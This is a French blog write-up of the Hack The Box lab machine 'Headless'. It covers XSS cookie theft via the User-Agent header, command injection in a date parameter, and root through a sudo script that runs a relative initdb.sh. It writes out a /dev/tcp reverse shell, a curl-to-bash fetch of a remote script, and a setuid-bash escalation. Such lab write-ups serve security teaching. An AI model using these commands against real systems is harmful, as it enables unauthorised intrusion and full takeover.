<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Headless</title>
<meta name=description content="Platforme: Hack The Box Lien: Headless Niveau: Facile OS: Linux Headless débute avec un site web statique. L&amp;rsquo;énumération nous permet d&amp;rsquo;identifier un …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-headless/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Headless"><meta property="og:description" content="Platforme: Hack The Box Lien: Headless Niveau: Facile OS: Linux Headless débute avec un site web statique. L&amp;rsquo;énumération nous permet d&amp;rsquo;identifier un …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Headless"><meta name=twitter:description content="Platforme: Hack The Box Lien: Headless Niveau: Facile OS: Linux Headless débute avec un site web statique. L&amp;rsquo;énumération nous permet d&amp;rsquo;identifier un …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-headless/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-headless/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Headless/Headless.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-headless/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-headless/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Headless</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>19 Juillet 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Headless>Headless</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Headless débute avec un site web statique. L&rsquo;énumération nous permet d&rsquo;identifier un formulaire de contact vulnérable au Cross-Site Scripting (XSS), mais les payloads standards s&rsquo;avèrent inefficaces. En capturant la valeur du cookie de l&rsquo;administrateur, nous accédons à la page du tableau de bord, puis au système cible grâce à l&rsquo;injection de commandes. Pour l&rsquo;escalade des privilèges, nous exploitons un script pour obtenir le contrôle du compte root.</p><p>Addresse IP cible - <code>10.10.11.8</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Headless 10.10.11.8
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-04 13:01 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.8
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.067s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>5000/tcp open  upnp?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> OK
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.11.2
</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#d19a66>04</span> Apr <span style=color:#d19a66>2024</span> 18:01:48 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d19a66>2799</span>
</span></span><span style=display:flex><span>|     Set-Cookie: <span style=color:#e06c75>is_admin</span><span style=color:#56b6c2>=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;viewport&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Under Construction&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;style&gt;
</span></span><span style=display:flex><span>|     body <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>|     font-family: <span style=color:#98c379>&#39;Arial&#39;</span>, sans-serif;
</span></span><span style=display:flex><span>|     background-color: <span style=color:#7f848e>#f7f7f7;</span>
</span></span><span style=display:flex><span>|     margin: 0;
</span></span><span style=display:flex><span>|     padding: 0;
</span></span><span style=display:flex><span>|     display: flex;
</span></span><span style=display:flex><span>|     justify-content: center;
</span></span><span style=display:flex><span>|     align-items: center;
</span></span><span style=display:flex><span>|     height: 100vh;
</span></span><span style=display:flex><span>|     .container <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>|     text-align: center;
</span></span><span style=display:flex><span>|     background-color: <span style=color:#7f848e>#fff;</span>
</span></span><span style=display:flex><span>|     border-radius: 10px;
</span></span><span style=display:flex><span>|     box-shadow: 0px 0px 20px rgba<span style=color:#56b6c2>(</span>0, 0, 0, 0.2<span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request version <span style=color:#56b6c2>(</span><span style=color:#98c379>&#39;RTSP/1.0&#39;</span><span style=color:#56b6c2>)</span>.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: <span style=color:#d19a66>400</span> - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|_    &lt;/html&gt;
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port5000-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>4/4%Time<span style=color:#56b6c2>=</span>660EEB0C%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%r<span style=color:#56b6c2>(</span>
</span></span><span style=display:flex><span>SF:GetRequest,BE1,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20Python/3\.11\.2\r\nDate:\x20Thu,\x2004\x20Apr\x202024\x2018:01:48\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-widt
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:h,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Constructi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:on&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20bo
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20&#39;Arial&#39;,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>RTSPRequest,16C,<span style=color:#98c379>&#34;&lt;!DOCTYPE
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20HTML&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20respo
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:nse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20versi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:on\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.23 seconds
</span></span></code></pre></div><h2 id=enumération>Enumération</h2><p>Nous trouvons le port 22 (SSH) et le port 5000 dont le service n&rsquo;est pas immédiatement reconnu. Quelques éléments peuvent être notés:</p><ul><li>Il semble s&rsquo;agir d&rsquo;un serveur web d&rsquo;après la réponse à la requête GetRequest.</li><li>Le logiciel du serveur est identifié comme &ldquo;Werkzeug/2.2.2 Python/3.11.2&rdquo;, ce qui suggère qu&rsquo;il exécute une application web Python utilisant le framework <a href=https://werkzeug.palletsprojects.com/en/3.0.x/>Werkzeug</a>.</li></ul><p>En visitant <code>http://10.10.11.8:5000/</code> nous trouvons une page web.</p><p><img src=/images/HTB-Headless/website-build.png alt="Headless webiste"></p><p>En cliquant sur le seul bouton présent, un formulaire de contact apparaît avec l&rsquo;url <code>http://10.10.11.8:5000/support</code>.</p><p><img src=/images/HTB-Headless/contact-form.png alt="Contact Support form"></p><p>L&rsquo;énumération des répertoires révèle <code>/dashboard</code> mais cette page est inaccessible actuellement et l&rsquo;énumération des sous-domaines échoue.</p><p><img src=/images/HTB-Headless/directory-bruteforcing.png alt="Gobuster command results"></p><p><img src=/images/HTB-Headless/dashboard-page.png alt="Dashboard page inaccessible"></p><p>Nous nous concentrons sur le formulaire de contact et le testons pour XSS.</p><p><img src=/images/HTB-Headless/XSS-attempt.png alt="XSS attempt"></p><p>Après la soumission, nous recevons un message indiquant qu&rsquo;une tentative de piratage a été détectée. Nous pouvons donc supposer que si notre payload est capable de contourner le mécanisme de détection, nous serons en mesure d&rsquo;exploiter la cible d&rsquo;une manière ou d&rsquo;une autre.</p><p><img src=/images/HTB-Headless/xss-detected.png alt="XSS detected"></p><p>Après plusieurs échecs de payloads, je remarque le nom du cookie <code>is_admin</code>; si nous obtenons la bonne valeur pour celui-ci, nous pourrons probablement accéder à <code>/dashboard</code>. La valeur actuelle du cookie indique <code>user</code> (il semble être encodé en base64).</p><p>Les payloads disponibles sur <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection>PayloadsAllTheThings</a> ont tous échoué. En cherchant d&rsquo;autres solutions, nous trouvons cet <a href=https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e>article medium</a> qui explique une autre façon de récupérer le cookie.</p><blockquote><p>J&rsquo;ai essayé le payload avec le paramètre <code>message</code> seul sans succès, mais après l&rsquo;avoir ajouté à <code>User-Agent</code>, nous sommes en mesure d&rsquo;obtenir la valeur du cookie sur notre serveur web.</p></blockquote><p><img src=/images/HTB-Headless/XSS-cookie-stealing-payload.png alt="Cookie stealing via XSS"></p><p>Le cookie est encodé en base64</p><p><img src=/images/HTB-Headless/admin-cookie-value.png alt="Admin cookie value"></p><p><img src=/images/HTB-Headless/cookie-value-decoded.png alt="Admin cookie value decoded"></p><p>Nous retournons à la page <code>/dashboard</code> et en utilisant la nouvelle valeur du cookie <code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code> nous obtenons l&rsquo;accès au tableau de bord de l&rsquo;administrateur.</p><p><img src=/images/HTB-Headless/cookie-editor.png alt=Cookie-Editor></p><p><img src=/images/HTB-Headless/Admin-dashboard.png alt="Admin dashboard accessed"></p><h2 id=accès-initial>Accès Initial</h2><p>La seule option disponible est de sélectionner une date et de générer un rapport. Après avoir capturé la requête, nous observons que le seul nouveau paramètre est <code>date</code>. Testons l&rsquo;injection de commande via ce paramètre.</p><p><img src=/images/HTB-Headless/report-request.png alt="Generate Report request"></p><p>Nous sommes en effet en mesure de faire de l&rsquo;injection de commande via le paramètre.</p><p><img src=/images/HTB-Headless/command-injection.png alt="Command Injection verified"></p><p>Essayer d&rsquo;obtenir un reverse shell directement via le paramètre <code>date</code> ne fonctionne pas, bien que la commande précédente ait été exécutée.</p><pre tabindex=0><code>date=2023-09-22;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1
</code></pre><p>Puisque l&rsquo;envoi du reverse shell ne fonctionne pas, nous pouvons essayer de l&rsquo;exécuter via curl en ajoutant <code>bash</code> à la fin de la commande. Nous plaçons le reverse shell dans un fichier et nous l&rsquo;exécutons sur la cible.</p><blockquote><p>Voici le reverse shell utilisé : <code>sh -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&amp;1</code></p></blockquote><pre tabindex=0><code>curl http://IP:PORT/revshell.sh|bash
</code></pre><p><img src=/images/HTB-Headless/reverse-shell.png alt="Reverse shell"></p><p>Après avoir envoyé la requête, nous obtenons un shell sur notre listener en tant qu&rsquo;utilisateur <code>dvir</code>.</p><p><img src=/images/HTB-Headless/foothold.png alt=Foothold></p><p>Nous améliorons notre shell à l&rsquo;aide des commandes ci-dessous.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116 
</code></pre><p>Dans le dossier personnel, nous trouvons le fichier <code>user.txt</code>.</p><p><img src=/images/HTB-Headless/user-flag.png alt="User flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Avec <code>sudo -l</code>, nous découvrons que cet utilisateur peut exécuter <code>/usr/bin/syscheck</code>.</p><p><img src=/images/HTB-Headless/sudo-l.png alt="sudo -l command"></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$EUID</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>0</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>last_modified_time</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/find /boot -name <span style=color:#98c379>&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span style=color:#56b6c2>{}</span> + | /usr/bin/sort -n | /usr/bin/tail -n 1<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>formatted_time</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/date -d <span style=color:#98c379>&#34;@</span><span style=color:#e06c75>$last_modified_time</span><span style=color:#98c379>&#34;</span> +<span style=color:#98c379>&#34;%d/%m/%Y %H:%M&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;Last Kernel Modification Time: </span><span style=color:#e06c75>$formatted_time</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>disk_space</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/df -h / | /usr/bin/awk <span style=color:#98c379>&#39;NR==2 {print $4}&#39;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;Available disk space: </span><span style=color:#e06c75>$disk_space</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>load_average</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/uptime | /usr/bin/awk -F<span style=color:#98c379>&#39;load average:&#39;</span> <span style=color:#98c379>&#39;{print $2}&#39;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;System load average: </span><span style=color:#e06c75>$load_average</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! /usr/bin/pgrep -x <span style=color:#98c379>&#34;initdb.sh&#34;</span> &amp;&gt;/dev/null; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;Database service is not running. Starting it...&#34;</span>
</span></span><span style=display:flex><span>  ./initdb.sh 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;Database service is running.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>exit</span> <span style=color:#d19a66>0</span>
</span></span></code></pre></div><p>Le script effectue plusieurs tâches telles que la vérification des privilèges root, la vérification de l&rsquo;espace disque disponible, etc. Mais notre chemin vers les privilèges root passe par le fichier <code>initdb.sh</code>.</p><p>Nous recherchons le fichier avec <code>find / -type f -name 'initdb.sh' 2>/dev/null</code> afin de le modifier, mais il n&rsquo;est pas sur le système et nous devons donc le créer.</p><pre tabindex=0><code>echo &#34;chmod u+s /bin/bash&#34; &gt; initdb.sh
</code></pre><p>La commande ci-dessus crée le fichier <code>initdb.sh</code> contenant la commande <code>chmod u+s /bin/bash</code> qui met le bit setuid (<code>u+s</code>) sur l&rsquo;exécutable <code>/bin/bash</code>.</p><p>L&rsquo;utilisateur <code>dvir</code> est autorisé à exécuter la commande <code>/usr/bin/syscheck</code> avec les privilèges sudo sans fournir de mot de passe.</p><hr><h3 id=explication-détaillée>Explication Détaillée</h3><p><code>initdb.sh</code> fait partie du script exécuté par <code>/usr/bin/syscheck</code>, et <code>initdb.sh</code> contient la commande <code>chmod u+s /bin/bash</code>, donc <code>dvir</code> peut obtenir les privilèges root en exécutant <code>/usr/bin/syscheck</code>. Le processus est le suivant:</p><ol><li><code>dvir</code> exécute <code>/usr/bin/syscheck</code> avec les privilèges sudo.</li><li>Dans le script exécuté par <code>/usr/bin/syscheck</code>, <code>initdb.sh</code> est exécuté.</li><li><code>initdb.sh</code> met le bit setuid sur <code>/bin/bash</code>, permettant à <code>/bin/bash</code> de s&rsquo;exécuter avec les permissions de son propriétaire (root) lorsqu&rsquo;il est exécuté par n&rsquo;importe quel utilisateur.</li><li>Après l&rsquo;exécution de <code>initdb.sh</code>, toute exécution ultérieure de <code>/bin/bash</code> par <code>dvir</code> s&rsquo;exécutera avec les privilèges de root, grâce au bit setuid qui a été défini.</li></ol><hr><p>Avec les commandes <code>sudo /usr/bin/syscheck</code> et <code>/bin/bash -p</code>, nous devenons root et trouvons <code>root.txt</code> dans <code>/root</code>.</p><p><img src=/images/HTB-Headless/root-flag.png alt="root flag"></p><h2 id=mots-de-fin>Mots de Fin</h2><p>Cette machine était relativement facile mais nécessitait une bonne compréhension de Linux et de Bash. Vous pouvez apprendre les deux sur HackTheBox Academy avec:</p><ul><li><a href=https://academy.hackthebox.com/module/details/18>Linux Fundamentals</a> et <a href=https://academy.hackthebox.com/module/details/51>Linux Privilege Escalation</a></li><li><a href=https://academy.hackthebox.com/module/details/21>Introduction to Bash Scripting</a></li></ul><p>Je recommande également de consulter plusieurs articles afin de découvrir différentes approches. Mes deux ressources favorites sont: <a href=https://0xdf.gitlab.io/2024/07/20/htb-headless.html#>0xdf</a> et <a href="https://www.youtube.com/watch?v=FDCpJbS1OuQ&amp;ab_channel=IppSec">IppSec</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-perfection/>&#8592;
Précédent:
HTB: Perfection</a></p><p class=prev-post-date>juillet 4, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-iclean/>Suivant:
HTB: IClean
&#8594;</a></p><p class=next-post-date>août 1, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
